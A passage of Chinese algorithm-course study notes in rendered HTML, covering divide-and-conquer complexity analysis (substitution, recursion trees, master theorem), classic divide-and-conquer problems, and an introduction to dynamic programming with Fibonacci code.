</span><span id="__span-0-85"><a id="__codelineno-0-85" name="__codelineno-0-85" href="#note-ads-wk5-__codelineno-0-85"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-0-86"><a id="__codelineno-0-86" name="__codelineno-0-86" href="#note-ads-wk5-__codelineno-0-86"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span id="__span-0-87"><a id="__codelineno-0-87" name="__codelineno-0-87" href="#note-ads-wk5-__codelineno-0-87"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-88"><a id="__codelineno-0-88" name="__codelineno-0-88" href="#note-ads-wk5-__codelineno-0-88"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-89"><a id="__codelineno-0-89" name="__codelineno-0-89" href="#note-ads-wk5-__codelineno-0-89"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%ld&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">chess</span><span class="p">.</span><span class="n">solutions</span><span class="p">.</span><span class="n">size</span><span class="p">());</span>
</span><span id="__span-0-90"><a id="__codelineno-0-90" name="__codelineno-0-90" href="#note-ads-wk5-__codelineno-0-90"></a><span class="p">}</span>
</span></code></pre></div>
</details></section><section class="print-page" id="note-ads-wk6" heading-number="2.2.3.8"><h1 id="note-ads-wk6-_1">分治法<a class="headerlink" href="#note-ads-wk6-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2143 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 1 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<p>我们主要关心分治法的时间复杂度的分析以及它的应用</p>
<h2 id="note-ads-wk6-_2">主定理<a class="headerlink" href="#note-ads-wk6-_2" title="Permanent link">&para;</a></h2>
<p>通常而言，分治法递归的时间复杂度有以下形式</p>
<div class="arithmatex">\[
    T(n) = aT(\frac{n}{b}) + f(n)
\]</div>
<p>其中<span class="arithmatex">\(a\)</span>是子问题的个数，<span class="arithmatex">\(b\)</span>是子问题的规模，<span class="arithmatex">\(f(n)\)</span>是合并的时间；</p>
<h3 id="note-ads-wk6-_3">代入法<a class="headerlink" href="#note-ads-wk6-_3" title="Permanent link">&para;</a></h3>
<p>代入法即猜想证明：</p>
<ul>
<li>猜测解的形式</li>
<li>使用数学归纳法求出解中的常数，并证明是正确的</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p><span class="arithmatex">\( T(N) = 2 \, T\left(\left\lfloor \frac{N}{2} \right\rfloor\right) + N \)</span></p>
<p><strong>Guess</strong>: <span class="arithmatex">\( T(N) = O(N \log N) \)</span></p>
<p><strong>Proof</strong>: Assume it is true for all <span class="arithmatex">\( m &lt; N \)</span>, in particular for <span class="arithmatex">\( m = \left\lfloor \frac{N}{2} \right\rfloor \)</span>.</p>
<p>Then there exists a constant <span class="arithmatex">\( c &gt; 0 \)</span> so that<br />
<span class="arithmatex">\( T\left(\left\lfloor \frac{N}{2} \right\rfloor\right) \leqslant c \left\lfloor \frac{N}{2} \right\rfloor \log \left\lfloor \frac{N}{2} \right\rfloor \)</span></p>
<p>Substituting into the recurrence:  </p>
<div class="arithmatex">\[\begin{align*}
  T(N) &amp;= 2 \, T\left(\left\lfloor \frac{N}{2} \right\rfloor\right) + N \\
  &amp;\leqslant 2 \, c \left\lfloor \frac{N}{2} \right\rfloor \log \left\lfloor \frac{N}{2} \right\rfloor + N \\
  &amp;\leqslant c \, N (\log N - \log 2) + N \\
  &amp;\leqslant c \, N \log N \quad \text{for } c \geqslant 1
\end{align*}\]</div>
<p>注意<span class="arithmatex">\(c\)</span>一定要是常数，不能与<span class="arithmatex">\(N\)</span>有关</p>
</div>
<p>可以通过记住一些常见的结论，例如归并排序来简化计算</p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<div class="arithmatex">\[
    T(n)=2T(\sqrt{n})+\log n
\]</div>
<p>令<span class="arithmatex">\(m=\log n\)</span>,则<span class="arithmatex">\(n=2^m\)</span>,则</p>
<div class="arithmatex">\[
    T(2^m)=2T(2^{m/2})+m
\]</div>
<p>令<span class="arithmatex">\(S(m)=T(2^m)\)</span>,则</p>
<div class="arithmatex">\[
    S(m)=2S(m/2)+m
\]</div>
<p>代入法得到<span class="arithmatex">\(S(m)=O(m \log m)\)</span>,所以<span class="arithmatex">\(T(n)=O(\log n \log \log n)\)</span></p>
</div>
<details class="quote">
<summary>算法导论-微妙的细节</summary>
<p><img alt="alt text" src="../NOTE/ADS/image-9.png" /></p>
</details>
<h3 id="note-ads-wk6-_4">递归树法<a class="headerlink" href="#note-ads-wk6-_4" title="Permanent link">&para;</a></h3>
<p>递归树法是一种分析递归算法复杂度的常用方法，特别适用于分治算法的复杂度分析；通过把递归过程表示为一棵树，分析树的每一层的代价，从而得出整个算法的时间复杂度。以下是递归树法的主要步骤：</p>
<ul>
<li>
<p><strong>构建递归树</strong>：将递归公式表示为一棵树，其中每个节点代表递归中的一次计算。根节点表示最初调用的递归问题，子节点表示递归调用的子问题，树的深度反映递归的层数。</p>
</li>
<li>
<p><strong>计算每一层的代价</strong>：对于递归树的每一层，计算该层所有节点的代价之和。通常，分治算法的每一层的计算量是相同的，或者遵循某种规律。</p>
</li>
<li>
<p><strong>汇总每层的代价</strong>：将每一层的代价相加，得到整个递归树的总代价。</p>
</li>
<li>
<p><strong>计算递归树的高度</strong>：递归树的高度代表递归调用的深度，通常与问题规模 <span class="arithmatex">\(N\)</span> 有关。树的高度可以通过递归公式中的分割因子来确定。</p>
</li>
<li>
<p><strong>总结总的复杂度</strong>：根据每层代价的总和以及递归树的高度，可以得出递归的总时间复杂度。</p>
</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>考虑经典的分治算法，例如合并排序，其递归公式为：</p>
<div class="arithmatex">\[
T(N) = 2T\left(\frac{N}{2}\right) + O(N)
\]</div>
<p>应用递归树法的步骤如下：</p>
<ol>
<li>
<p><strong>构建递归树</strong>：</p>
</li>
<li>
<p>根节点为规模 <span class="arithmatex">\(N\)</span> 的问题，分解成两个规模为 <span class="arithmatex">\(N/2\)</span> 的子问题。</p>
</li>
<li>
<p>每个子问题进一步分解，直到分解到规模为 1 的问题。</p>
</li>
<li>
<p><strong>计算每一层的代价</strong>：</p>
</li>
<li>
<p>第一层的代价是 <span class="arithmatex">\(O(N)\)</span>。</p>
</li>
<li>第二层的两个子问题各自代价为 <span class="arithmatex">\(O(N/2)\)</span>，总计 <span class="arithmatex">\(O(N)\)</span>。</li>
<li>第三层有四个子问题，每个代价 <span class="arithmatex">\(O(N/4)\)</span>，总计 <span class="arithmatex">\(O(N)\)</span>。</li>
</ol>
<p>可以看出每一层的代价都是 <span class="arithmatex">\(O(N)\)</span>。</p>
<ol>
<li>
<p><strong>汇总每层的代价</strong>：</p>
</li>
<li>
<p>由于每一层的代价都是 <span class="arithmatex">\(O(N)\)</span>，如果递归树有 <span class="arithmatex">\( \log N \)</span> 层，那么总代价为 <span class="arithmatex">\(O(N \log N)\)</span>。</p>
</li>
<li>
<p><strong>计算递归树的高度</strong>：</p>
</li>
<li>
<p>递归树的高度为 <span class="arithmatex">\( \log N\)</span>，因为每次将问题规模减半，直到规模为 1。</p>
</li>
<li>
<p><strong>总结总的复杂度</strong>：</p>
</li>
<li>
<p>根据每层代价的总和以及树的高度，得到总时间复杂度为 <span class="arithmatex">\(O(N \log N)\)</span>。</p>
</li>
</ol>
</div>
<h3 id="note-ads-wk6-_5">主定理<a class="headerlink" href="#note-ads-wk6-_5" title="Permanent link">&para;</a></h3>
<p>对于</p>
<div class="arithmatex">\[
    T(n) = a T\left(\frac{n}{b}\right) + f(n),a \geqslant 1,b \geqslant 1
\]</div>
<p>则</p>
<div class="admonition section">
<p class="admonition-title">Section</p>
<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="note-ads-wk6-_5-形式1" name="note-ads-wk6-__tabbed_1" type="radio" /><input id="note-ads-wk6-_5-形式2" name="note-ads-wk6-__tabbed_1" type="radio" /><input id="note-ads-wk6-_5-形式3" name="note-ads-wk6-__tabbed_1" type="radio" /><input id="note-ads-wk6-_5-形式3-pro" name="note-ads-wk6-__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="note-ads-wk6-_5-形式1">形式1</label><label for="note-ads-wk6-_5-形式2">形式2</label><label for="note-ads-wk6-_5-形式3">形式3</label><label for="note-ads-wk6-_5-形式3-pro">形式3-pro</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<ul>
<li>如果<span class="arithmatex">\(f(n)=O(n^{\log_b a-\epsilon})\)</span>,则<span class="arithmatex">\(T(n)=\Theta(n^{\log_b a})\)</span></li>
<li>如果<span class="arithmatex">\(f(n)=\Theta(n^{\log_b a})\)</span>,则<span class="arithmatex">\(T(n)=\Theta(n^{\log_b a} \log n)\)</span></li>
<li>如果<span class="arithmatex">\(f(n)=\Omega(n^{\log_b a+\epsilon})\)</span>,且对于某个常数<span class="arithmatex">\(c&lt;1\)</span>和所有足够大的<span class="arithmatex">\(n\)</span>有</li>
</ul>
<div class="arithmatex">\[
     a f\left(\frac{n}{b}\right) \leqslant c f(n)
\]</div>
<p>则<span class="arithmatex">\(T(n)=\Theta(f(n))\)</span></p>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>这三种情况并未覆盖 <span class="arithmatex">\(f(n)\)</span> 的所有可能性。情况 1 和情况 2 之间有一定间隙，情况 2 和情况 3 之间也有一定间隙。如果函数 <span class="arithmatex">\(f(n)\)</span> 落在这两个间隙中，或者情况 3 中要求的正则条件不成立.就不能使用主方法来求解递归式</p>
</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>实际上主定理并不需要死记硬背，无论什么形式的主定理，其实关键都在于比较 <span class="arithmatex">\(n^{\log_b a}\)</span> 和 <span class="arithmatex">\(f(n)\)</span> 之间的关联，如果前者大，则前者 “掌控了” 整个时间复杂度，所以时间复杂度就是 <span class="arithmatex">\(T(n) = aT(n/b)\)</span> 对应的复杂度，这也很符合直观，因为此时 <span class="arithmatex">\(a\)</span> 比较大，分叉比较多，树比较大（结合前面递归树的例子），所以更大的复杂度会落在叶子上；反之后者大则每一层的复杂度 “掌控了” 整个时间复杂度，故整体时间就是 <span class="arithmatex">\(f(n)\)</span> 级别的。这也就是 “主定理” 这一名字的含义，十分形象，就是看前后两半谁 master 了整体时间复杂度</p>
</div>
</div>
<div class="tabbed-block">
<ul>
<li>若对于某个常数<span class="arithmatex">\(c&gt;1\)</span>,有<span class="arithmatex">\(af(\frac{n}{b})=cf(n)\)</span>,则<span class="arithmatex">\(T(n)=\Theta(n^{\log_b a})\)</span></li>
<li>若<span class="arithmatex">\(af(\frac{n}{b})=f(n)\)</span>,则<span class="arithmatex">\(T(n)=\Theta(n^{\log_b a}\log n)\)</span></li>
<li>若对于某个常数<span class="arithmatex">\(c&lt;1\)</span>,有<span class="arithmatex">\(af(\frac{n}{b})=cf(n)\)</span>,则<span class="arithmatex">\(T(n)=\Theta(f(n))\)</span></li>
</ul>
<p>这实际上是形式1的推论，可以直观上来理解一下</p>
<ul>
<li>情况1说明每次分治对于<span class="arithmatex">\(f(n)\)</span>的影响很大，将它分得很小，所以复杂度由前半部分控制</li>
<li>情况2说明每次分治对于<span class="arithmatex">\(f(n)\)</span>的影响适中，将它分得适中，所以复杂度是共同影响</li>
<li>情况3说明每次分治对于<span class="arithmatex">\(f(n)\)</span>的影响很小，将它分得很大，所以复杂度由后半部分控制</li>
</ul>
</div>
<div class="tabbed-block">
<p>对于递推式</p>
<div class="arithmatex">\[
    T(n)=aT(n/b)+\Theta(n^k \log^p n) \ a \geqslant 1,b&gt;1,k \geqslant 0,p \geqslant 0
\]</div>
<p>有如下结论：</p>
<ul>
<li>若 <span class="arithmatex">\(\log_b a &gt; k\)</span>，则 <span class="arithmatex">\(T(n) = \Theta(n^{\log_b a})\)</span></li>
<li>若 <span class="arithmatex">\(\log_b a = k\)</span>，则 <span class="arithmatex">\(T(n) = \Theta(n^k \log^{p+1} n)\)</span></li>
<li>若 <span class="arithmatex">\(\log_b a &lt; k\)</span>，则 <span class="arithmatex">\(T(n) = \Theta(n^k \log^p n)\)</span></li>
</ul>
<p>这里的主要变化是第二种情况，它相比于原先的形式更加强大，如果按照原来的形式就是<span class="arithmatex">\(n^k \log n\)</span>,这里在对数的基础上增强了；</p>
</div>
<div class="tabbed-block">
<ul>
<li>若 <span class="arithmatex">\(\log_b a &gt; k\)</span>，则 <span class="arithmatex">\(T(n) = \Theta(n^{\log_b a})\)</span></li>
<li>若 <span class="arithmatex">\(\log_b a = k\)</span>，则 <ul>
<li><span class="arithmatex">\(p&gt;-1\)</span>,<span class="arithmatex">\(T(n) = \Theta(n^k \log^{p+1} n)\)</span></li>
<li><span class="arithmatex">\(p=-1\)</span>,<span class="arithmatex">\(T(n) = \Theta(n^k \log \log n)\)</span></li>
<li><span class="arithmatex">\(p&lt;-1\)</span>,<span class="arithmatex">\(T(n) = \Theta(n^k)\)</span></li>
</ul>
</li>
<li>若 <span class="arithmatex">\(\log_b a &lt; k\)</span>，则<ul>
<li><span class="arithmatex">\(p \geqslant 0\)</span>,<span class="arithmatex">\(T(n) = \Theta(n^k \log^p n)\)</span></li>
<li><span class="arithmatex">\(p&lt;0\)</span>,<span class="arithmatex">\(T(n) = \Theta(n^k)\)</span></li>
</ul>
</li>
</ul>
</div>
</div>
</div>
</div>
<h2 id="note-ads-wk6-_6">分治法的应用<a class="headerlink" href="#note-ads-wk6-_6" title="Permanent link">&para;</a></h2>
<blockquote>
<p>回忆梦开始的地方</p>
</blockquote>
<h3 id="note-ads-wk6-_7">最大子序列问题<a class="headerlink" href="#note-ads-wk6-_7" title="Permanent link">&para;</a></h3>
<p>最大子序列问题是一个经典的分治算法问题，其目标是找到一个序列中的一个连续子序列，使得该子序列的和最大。即寻找子数组 <code>A[low,high]</code> 的最大子序列和，我们首先找到数组中央位置 <code>mid</code>，这个问题可以通过分治算法来解决，其基本思路是将问题分解成三个子问题,假设目标子序列是<span class="arithmatex">\(A[i,j]\)</span>：</p>
<ol>
<li>最大子序列和完全在 <code>A[low,high]</code>中，即 <span class="arithmatex">\(low \leqslant i \leqslant j \leqslant mid\)</span>；</li>
<li>最大子序列和完全在 <code>A[mid+1,high]</code> 中，即 <span class="arithmatex">\(mid+1 \leqslant i \leqslant j \leqslant high\)</span>；</li>
<li>
<p>最大子序列和跨越 <code>mid</code> 两边，即 <span class="arithmatex">\(low \leqslant i \leqslant mid &lt; j \leqslant high\)</span>。</p>
</li>
<li>
<p>分治：将原数组平分为两半 <code>A[low, mid]</code> 和 <code>A[mid + 1, high]</code>，然后分别对这两半求解最大子序列和；一定不能忘记递归有 base case，这里的 base case 就是数组只剩下一个元素，那就什么都不用操作，直接返回进入下一步合并阶段；</p>
</li>
<li>
<p>合并：首先我们要计算跨越 <code>mid</code> 两边的最大子序列和，然后和左右两半的结果比较，选择最大的作为最终结果。关键在于计算跨越 <code>mid</code> 两边的最大子序列和，这其实是线性的，为什么？因为这里的子序列都必须跨越 <code>mid</code>，所以最大子序列和就是最大的 <code>A[i, mid]</code> 加上最大的 <code>A[mid + 1, j]</code>，这个只需要对 <code>i</code>, <code>j</code> 做遍历就行，所以是线性的。</p>
</li>
</ol>
<p>那么我们得到的递推公式就是很简单的 <span class="arithmatex">\(T(n) = 2T(n/2) + O(n)\)</span>，所以就是 <span class="arithmatex">\(O(n \log n)\)</span> 的复杂度。</p>
<div class="admonition info">
<p class="admonition-title">exstra</p>
<p>归并排序与快速排序的时间复杂度都是<span class="arithmatex">\(O(n \log n)\)</span>；
注意快速排序最坏是<span class="arithmatex">\(O(n^2)\)</span>，
但是其期望时间复杂度是 <span class="arithmatex">\(O(n \log n)\)</span></p>
</div>
<h3 id="note-ads-wk6-_8">逆序对计数<a class="headerlink" href="#note-ads-wk6-_8" title="Permanent link">&para;</a></h3>
<details class="note">
<summary>逆序数</summary>
<p>逆序对计数问题是计算一个数组中逆序对的数量的经典算法问题。在一个数组中，逆序对指的是数组中满足以下条件的一对元素 <span class="arithmatex">\((i, j)\)</span>：</p>
<ul>
<li><strong>索引条件</strong>：<span class="arithmatex">\(i &lt; j\)</span></li>
<li><strong>大小关系</strong>：<span class="arithmatex">\(A[i] &gt; A[j]\)</span></li>
</ul>
<p>换句话说，逆序对是数组中一个较大的数出现在一个较小的数之前的情况。</p>
</details>
<p>分治法将问题分为三类</p>
<ul>
<li>全在左半边的逆序对个数</li>
<li>全在右半边的逆序对个数</li>
<li>跨越中点的逆序对个数</li>
</ul>
<p>但是跨越中点的逆序对个数看起来似乎有<span class="arithmatex">\(\frac{n}{2} * \frac{n}{2}\)</span>种，所以我们每次算完左右两边的逆序对个数后，进行一次merge sort，那么合并过程中计算跨越中点的逆序对个数就只需要线性时间了：在合并两个已排序的子序列的过程中我们就很容易完成逆序对的计算</p>
<h3 id="note-ads-wk6-_9">最近点对问题<a class="headerlink" href="#note-ads-wk6-_9" title="Permanent link">&para;</a></h3>
<p>这是相当经典的应用。同样分为三个部分，左最近点对、右最近点对和分离最近点对，那么关键就在于线性地找到分离最近点对。</p>
<p>我们记 <span class="arithmatex">\(x\)</span> 坐标的中点的横坐标为 <span class="arithmatex">\(\overline{x}\)</span>，记作左右两半中最近点对距离为 <span class="arithmatex">\(\delta\)</span>。因为我们要找分离最近点对，于是只要考虑 <span class="arithmatex">\([\overline{x}-\delta, \overline{x}+\delta]\)</span> 之间的所有点 $ q_1, q_2, \cdots, q_n $，它们按 <span class="arithmatex">\(y\)</span> 坐标从小到大排序。设 <span class="arithmatex">\(q_i\)</span> 的  <span class="arithmatex">\(y\)</span> 坐标为 <span class="arithmatex">\(y_i\)</span>，那么我们只需要从下往上检查坐标在 <span class="arithmatex">\([\overline{x}-\delta, \overline{x}+\delta]\)</span> 和 <span class="arithmatex">\([y_i, y_i+\delta]\)</span> 之间的长方形区域中的所有点，考察这些点是否和 <span class="arithmatex">\(q_i\)</span> 有更近的点对即可。</p>
<p>我们将这个长方形区域分为平均分割成 8 块，则每块内最多出现一个点（否则每块内两点之间的距离就不超过 <span class="arithmatex">\(\dfrac{\sqrt{2}}{2} \delta\)</span> 了，这就与左右两半中最近点对距离为 <span class="arithmatex">\(\delta\)</span> 相矛盾），于是对于每个 <span class="arithmatex">\(q_i\)</span>，我们至多只需要向上找 7 个点即可。</p>
<p>实际上我们还可以把这 7 个点进一步减少：</p>
<ul>
<li>
<p>例如当前我们循环到了一个在左半边的点，那么整个左半边的点都不需要考虑，只需要考虑右半边 4 个格子最多的 4 个点。但要注意的是这种情况你需要提前维护好左右两边各自的按 y 坐标排序的点列，然后要维护 y 坐标紧跟着左半边的每个点的四个右半边的点，对称的右半边也要维护，这并不复杂。</p>
</li>
<li>
<p>再更进一步，我们还可以将 4 这个数字降为 3。因为我们每在右半部分放一个点(<span class="arithmatex">\(q_i\)</span> 在右半部分)，那么在右半部分，以这个点为圆心半径为 <span class="arithmatex">\(\delta\)</span> 的圆内不可能再有另一个点，事实上最差的情况就是有四个这样的圆心，此时这四个圆心在左半区域的四个角上（<span class="arithmatex">\((0,0)\)</span>, <span class="arithmatex">\((0, \delta)\)</span>, <span class="arithmatex">\((\delta, 0)\)</span>, <span class="arithmatex">\((\delta, \delta)\)</span>），这时候毫无疑问的就是 <span class="arithmatex">\((0, 0)\)</span> 处的点最好。而其它情况下不可能有四个圆心，只能有三个，那么在最多三个圆心中寻找最近点对，也就只需要遍历 3 个点就足够了</p>
</li>
</ul></section><section class="print-page" id="note-ads-wk7" heading-number="2.2.3.9"><h1 id="note-ads-wk7-dynamic-programming">Dynamic Programming<a class="headerlink" href="#note-ads-wk7-dynamic-programming" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2994 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 58 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 11 分钟</p>
</div>
<div class="admonition quote">
<p class="admonition-title">动态规划的由来</p>
<p>动态规划（Dynamic Programming，DP）是一种解决最优化问题的方法，它通过将复杂问题分解为更简单的子问题来求解。这种方法最早由理查德·贝尔曼（Richard Bellman）在1950年代提出，最初是用于解决决策过程中的问题，尤其是在控制论和运筹学领域。</p>
<p>动态规划的基本思想是利用子问题的最优解构造出原问题的最优解。它的由来可以追溯到以下几个关键点：</p>
<ul>
<li>
<p><strong>重叠子问题</strong>：许多最优化问题可以分解成重叠的子问题，动态规划通过记录子问题的解来避免重复计算。</p>
</li>
<li>
<p><strong>最优子结构</strong>：如果一个问题的最优解包含其子问题的最优解，则可以通过解决子问题来构造原问题的解。</p>
</li>
<li>
<p><strong>贝尔曼方程</strong>：贝尔曼提出了一个递归关系（即贝尔曼方程），描述了如何通过子问题的解来得到原问题的解。</p>
</li>
</ul>
<p>动态规划的应用广泛，包括背包问题、最短路径问题、最长公共子序列等多个领域，是算法设计中一个非常重要的概念。</p>
</div>
<h2 id="note-ads-wk7--">引入动态规划-爬楼梯问题<a class="headerlink" href="#note-ads-wk7--" title="Permanent link">&para;</a></h2>
<div class="admonition question">
<p class="admonition-title">Question</p>
<p>假设你正在爬楼梯。需要爬 n 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶，求有多少种不同的方法爬到楼顶，我们要求算法在线性时间内解决这一问题。</p>
</div>
<p>如果我们要使用常规的计数方法或者分治法来计算，其时间复杂度是达不到线性时间的要求的；但是我们可以使用动态规划的方法来解决这个问题。</p>
<p>考虑最后一步，当我们即将到达楼顶时，我们可以选择爬 1 个台阶或者 2 个台阶。如果我们选择爬 1 个台阶，那么前面的 n-1 个台阶有多少种爬法我们已经知道了；如果我们选择爬 2 个台阶，那么前面的 n-2 个台阶有多少种爬法我们也知道了。因此，爬到第 n 阶的方法数就是爬到第 n-1 阶和第 n-2 阶的方法数之和。即：</p>
<div class="arithmatex">\[
   f(n) = f(n-1) + f(n-2)
\]</div>
<p>这就是斐波那契数，然而虽然这个形式是如此优美，代码也是如此简单</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk7-__codelineno-0-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">fib</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk7-__codelineno-0-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk7-__codelineno-0-3"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="mi">-1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">fib</span><span class="p">(</span><span class="n">n</span><span class="mi">-2</span><span class="p">);</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk7-__codelineno-0-4"></a><span class="p">}</span>
</span></code></pre></div>
<p>但是每一次计算我们都需要计算到最深再返回，这样的时间复杂度是爆炸的；我们可以使用动态规划的方法来解决这个问题，我们可以使用一个数组来保存每一步的结果，这样我们就可以在 O(n) 的时间内解决这个问题。</p>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk7-__codelineno-1-1"></a><span class="kt">int</span><span class="w"> </span><span class="nf">fib</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk7-__codelineno-1-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk7-__codelineno-1-3"></a><span class="w">    </span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="w"> </span><span class="n">dp</span><span class="p">(</span><span class="n">n</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk7-__codelineno-1-4"></a><span class="w">    </span><span class="n">dp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk7-__codelineno-1-5"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
